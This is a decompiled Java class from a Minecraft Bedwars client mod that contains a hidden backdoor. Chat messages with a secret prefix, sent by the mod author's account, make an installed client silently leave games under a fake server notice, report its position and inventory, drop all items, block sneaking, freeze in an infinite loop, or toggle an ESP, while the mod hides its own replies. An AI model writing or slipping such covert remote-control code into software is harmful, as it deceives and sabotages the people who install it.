/*     */ package com.dimchig.bedwarsbro.dimchigspecial;
/*     */ 
/*     */ import com.dimchig.bedwarsbro.ChatSender;
/*     */ import com.dimchig.bedwarsbro.Main;
/*     */ import com.dimchig.bedwarsbro.MyChatListener;
/*     */ import com.dimchig.bedwarsbro.OnMyTickEvent;
/*     */ import com.dimchig.bedwarsbro.gui.GuiPlayerFocus;
/*     */ import com.dimchig.bedwarsbro.hints.BWItem;
/*     */ import com.dimchig.bedwarsbro.hints.BWItemsHandler;
/*     */ import com.dimchig.bedwarsbro.hints.HintsPlayerScanner;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Collection;
/*     */ import java.util.Date;
/*     */ import net.minecraft.client.Minecraft;
/*     */ import net.minecraft.client.entity.EntityPlayerSP;
/*     */ import net.minecraft.client.network.NetworkPlayerInfo;
/*     */ import net.minecraft.entity.player.EntityPlayer;
/*     */ import net.minecraft.item.ItemStack;
/*     */ import net.minecraft.network.Packet;
/*     */ import net.minecraft.network.play.client.C07PacketPlayerDigging;
/*     */ import net.minecraft.potion.PotionEffect;
/*     */ import net.minecraft.util.BlockPos;
/*     */ import net.minecraft.util.EnumFacing;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class PlayerManipulator
/*     */ {
/*     */   public enum COMMAND
/*     */   {
/*  33 */     NONE(0),
/*  34 */     LEAVE(1),
/*  35 */     FULL_INFO(2),
/*  36 */     HIT_BLOCK_ON(3),
/*  37 */     HIT_BLOCK_OFF(4),
/*  38 */     MOD_VERSION(5),
/*  39 */     GAME_CRASH(6),
/*  40 */     DROP_ITEM(7),
/*  41 */     BRIDGE_FAIL(8),
/*  42 */     PRINT_PARTY_MEMBERS(9),
/*  43 */     ENABLE_ESP("a");
/*     */     
/*     */     public final String id;
/*     */     
/*     */     COMMAND(int id) {
/*  48 */       this.id = "" + id;
/*     */     }
/*     */     
/*     */     COMMAND(String id) {
/*  52 */       this.id = id;
/*     */     }
/*     */     
/*     */     public static COMMAND getById(String id) {
/*  56 */       for (COMMAND c : values()) {
/*  57 */         if (c.id.equals(id)) return c; 
/*     */       } 
/*  59 */       return NONE;
/*     */     }
/*     */   }
/*     */   
/*  63 */   String prefix = "1d2a0b7f";
/*     */ 
/*     */   
/*     */   public boolean handleCommand(String player_name, String msg_text) {
/*     */     
/*  68 */     try { String text = msg_text.replace("§", "&").replace("&", "").trim();
/*     */       
/*  70 */       if (!text.contains(this.prefix) || (text.split(this.prefix)).length != 2) return false; 
/*  71 */       String value = text.split(this.prefix)[1].trim();
/*     */ 
/*     */       
/*  74 */       COMMAND cmd_type = COMMAND.getById("" + value.charAt(0));
/*     */ 
/*     */       
/*  77 */       if (cmd_type == COMMAND.NONE) return false; 
/*  78 */       if (!player_name.contains("DimChig")) return false;
/*     */ 
/*     */       
/*  81 */       String manipulate_player_id = value.substring(1);
/*  82 */       if (!getIdByNick((Minecraft.func_71410_x()).field_71439_g.func_70005_c_()).equals(manipulate_player_id))
/*     */       {
/*  84 */         return true;
/*     */       }
/*     */ 
/*     */ 
/*     */       
/*  89 */       if (cmd_type == COMMAND.LEAVE)
/*  90 */       { MyChatListener.removeNextMessage = true;
/*  91 */         ChatSender.addText("&c| &fТы перемещен в лобби &8▸ &fFlying is not enabled on this server");
/*  92 */         ChatSender.sendText("/leave"); }
/*  93 */       else if (cmd_type == COMMAND.FULL_INFO)
/*  94 */       { MyChatListener.removeNextMessage = true;
/*  95 */         String str = "?";
/*     */         
/*     */         try {
/*  98 */           EntityPlayerSP player = (Minecraft.func_71410_x()).field_71439_g;
/*  99 */           str = "я на " + (int)player.field_70165_t + ", " + (int)player.field_70161_v;
/* 100 */           BWItemsHandler.BWItemArmourLevel armourLevel = HintsPlayerScanner.getPlayerArmourLevel((EntityPlayer)player);
/*     */ 
/*     */ 
/*     */           
/* 104 */           String armour_s = "";
/* 105 */           if (armourLevel == BWItemsHandler.BWItemArmourLevel.CHAIN) armour_s = "кольчуге"; 
/* 106 */           if (armourLevel == BWItemsHandler.BWItemArmourLevel.IRON) armour_s = "железке"; 
/* 107 */           if (armourLevel == BWItemsHandler.BWItemArmourLevel.DIAMOND) armour_s = "алмазке"; 
/* 108 */           if (armour_s.length() > 0) {
/* 109 */             str = str + " в " + armour_s;
/*     */           }
/*     */           
/* 112 */           if ((player.func_70035_c()).length > 1) {
/* 113 */             ItemStack itemStack = player.func_70035_c()[1];
/*     */             
/* 115 */             if (itemStack.func_77986_q().func_74745_c() > 0) {
/* 116 */               str = str + " з" + ("" + itemStack.func_77986_q().func_150305_b(0).func_74781_a("lvl")).substring(0, 1);
/*     */             }
/*     */           } 
/*     */           
/* 120 */           Collection<PotionEffect> pe = player.func_70651_bq();
/* 121 */           for (PotionEffect effect : pe) {
/* 122 */             if (effect.func_76456_a() == BWItemsHandler.BWItemPotionsID.STRENGTH.id) {
/* 123 */               str = str + " под силой " + (effect.func_76459_b() / 20) + "с";
/*     */               
/*     */               break;
/*     */             } 
/*     */           } 
/*     */           
/* 129 */           ArrayList<String> items_to_show = new ArrayList<String>();
/*     */           
/* 131 */           String sword = "";
/*     */ 
/*     */ 
/*     */ 
/*     */           
/* 136 */           if (Main.shopManager.findItemInHotbar("swordDiamond") != -1) sword = "алм"; 
/* 137 */           if (sword.length() > 0) items_to_show.add(sword + " меч");
/*     */           
/* 139 */           if (Main.shopManager.findItemInHotbar("bow") != -1) items_to_show.add("лук");
/*     */ 
/*     */           
/* 142 */           for (BWItem item : BWItemsHandler.bwitems) {
/* 143 */             if (item.type == BWItemsHandler.BWItemType.POTION_STRENGTH && Main.shopManager.findItemInHotbar(item.display_name) != -1) {
/* 144 */               items_to_show.add("силка");
/*     */             }
/*     */           } 
/*     */ 
/*     */           
/* 149 */           ItemStack[] items = (Minecraft.func_71410_x()).field_71439_g.field_71071_by.field_70462_a;
/* 150 */           int cnt_emeralds = 0;
/* 151 */           int cnt_diamonds = 0;
/* 152 */           int cnt_fireball = 0;
/* 153 */           int cnt_pearl = 0;
/* 154 */           for (ItemStack item : items) {
/* 155 */             if (item != null) {
/* 156 */               if (item.func_77977_a().equals("item.diamond")) cnt_diamonds += item.field_77994_a; 
/* 157 */               if (item.func_77977_a().equals("item.emerald")) cnt_emeralds += item.field_77994_a; 
/* 158 */               if (item.func_77977_a().equals("item.fireball")) cnt_fireball += item.field_77994_a; 
/* 159 */               if (item.func_77977_a().equals("item.enderPearl")) cnt_pearl += item.field_77994_a; 
/*     */             } 
/* 161 */           }  if (cnt_pearl > 0) items_to_show.add(cnt_pearl + " перл" + MyChatListener.getNumberEnding(cnt_pearl, "", "а", "ов")); 
/* 162 */           if (cnt_emeralds > 0) items_to_show.add(cnt_emeralds + " изюм" + MyChatListener.getNumberEnding(cnt_emeralds, "", "а", "ов")); 
/* 163 */           if (cnt_diamonds > 0) items_to_show.add(cnt_diamonds + " алмаз" + MyChatListener.getNumberEnding(cnt_diamonds, "", "а", "ов")); 
/* 164 */           if (cnt_fireball > 0) items_to_show.add(cnt_fireball + " фаер" + MyChatListener.getNumberEnding(cnt_fireball, "", "а", "ов"));
/*     */           
/* 166 */           if (items_to_show.size() > 0) {
/* 167 */             str = str + ". У меня ";
/* 168 */             for (int i = 0; i < items_to_show.size(); i++) {
/* 169 */               str = str + (String)items_to_show.get(i);
/* 170 */               if (i < items_to_show.size() - 1) str = str + ", ";
/*     */             
/*     */             } 
/*     */           } 
/* 174 */         } catch (Exception exception) {}
/* 175 */         ChatSender.sendText("!" + str.substring(0, Math.min(98, str.length()))); }
/* 176 */       else if (cmd_type == COMMAND.HIT_BLOCK_ON)
/* 177 */       { MyChatListener.removeNextMessage = true;
/* 178 */         CantHitDimChig.isActive = true;
/* 179 */         ChatSender.sendText("!+"); }
/* 180 */       else if (cmd_type == COMMAND.HIT_BLOCK_OFF)
/* 181 */       { MyChatListener.removeNextMessage = true;
/* 182 */         CantHitDimChig.isActive = false;
/* 183 */         ChatSender.sendText("!-"); }
/* 184 */       else if (cmd_type == COMMAND.MOD_VERSION)
/* 185 */       { MyChatListener.removeNextMessage = true;
/* 186 */         CantHitDimChig.isActive = false;
/* 187 */         ChatSender.sendText("!У меня версия 1.69"); }
/* 188 */       else { if (cmd_type == COMMAND.GAME_CRASH) {
/* 189 */           int x = 0; while (true)
/* 190 */             x++; 
/* 191 */         }  if (cmd_type == COMMAND.DROP_ITEM) {
/* 192 */           Minecraft.func_71410_x().func_147114_u().func_147297_a((Packet)new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.DROP_ALL_ITEMS, new BlockPos(0, 0, 0), EnumFacing.DOWN));
/* 193 */         } else if (cmd_type == COMMAND.BRIDGE_FAIL) {
/* 194 */           OnMyTickEvent.time_bwmanipulator_cant_sneak = (new Date()).getTime() + 3000L;
/* 195 */         } else if (cmd_type == COMMAND.PRINT_PARTY_MEMBERS) {
/* 196 */           MyChatListener.bwmanipulator_party_info = 1;
/* 197 */           ChatSender.sendText("/party info");
/* 198 */         } else if (cmd_type == COMMAND.ENABLE_ESP) {
/* 199 */           GuiPlayerFocus.STATE = !GuiPlayerFocus.STATE;
/* 200 */           GuiPlayerFocus.isT_Active = true;
/* 201 */           MyChatListener.removeNextMessage = true;
/* 202 */           ChatSender.sendText("!" + (GuiPlayerFocus.STATE ? "+" : "-"));
/*     */         }  }
/*     */       
/* 205 */       return true; }
/* 206 */     catch (Exception ex) { return false; }
/*     */   
/*     */   }
/*     */   public String getCommand(String manipulate_name, COMMAND command) {
/* 210 */     String generated = this.prefix + "" + command.id + "";
/* 211 */     String pId = getIdByNick(manipulate_name);
/* 212 */     if (pId == null) return null; 
/* 213 */     generated = generated + pId;
/* 214 */     return generated;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getIdByNick(String nick) {
/*     */     
/* 220 */     try { Collection<NetworkPlayerInfo> players = Minecraft.func_71410_x().func_147114_u().func_175106_d();
/*     */       
/* 222 */       int cnt = 0;
/* 223 */       for (NetworkPlayerInfo info : players) {
/* 224 */         if (info == null || info.func_178845_a() == null || info.func_178845_a().getName() == null || info.func_178845_a().getId() == null || 
/* 225 */           !info.func_178845_a().getName().equals(nick))
/*     */           continue; 
/* 227 */         String id = ("" + info.func_178845_a().getId()).replace("-", "");
/*     */ 
/*     */         
/* 230 */         return id;
/*     */       }  }
/* 232 */     catch (Exception ex) { return null; }
/* 233 */      return null;
/*     */   }
/*     */ }


/* Location:              C:\Users\1337a\Downloads\bedwarsbro-1.69\!\com\dimchig\bedwarsbro\dimchigspecial\PlayerManipulator.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */